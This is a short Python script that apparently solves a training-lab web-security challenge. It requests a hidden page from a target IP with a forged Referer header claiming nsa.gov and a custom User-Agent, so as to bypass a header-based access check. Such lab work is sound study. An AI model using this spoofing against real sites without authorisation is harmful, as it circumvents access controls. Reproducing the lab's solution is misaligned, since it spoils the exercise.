import sys
import requests
import urllib.parse

def try_referer_spoofing():
    encoded_params = urllib.parse.urlencode({ 'page': 'b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' })

    url = f'http://{sys.argv[1]}/?{{}}'.format(encoded_params)

    headers = {
        'Referer': "https://www.nsa.gov/",
        'User-Agent': "ft_bornToSec"
    }

    response = requests.get(url, headers=headers)

    return response.text

def main():
    try:
        assert len(sys.argv) == 2, "IP address is not valid."
        
        print(try_referer_spoofing())
    except Exception as err:
        print(f'Error: {err}')

if __name__ == "__main__":
    main()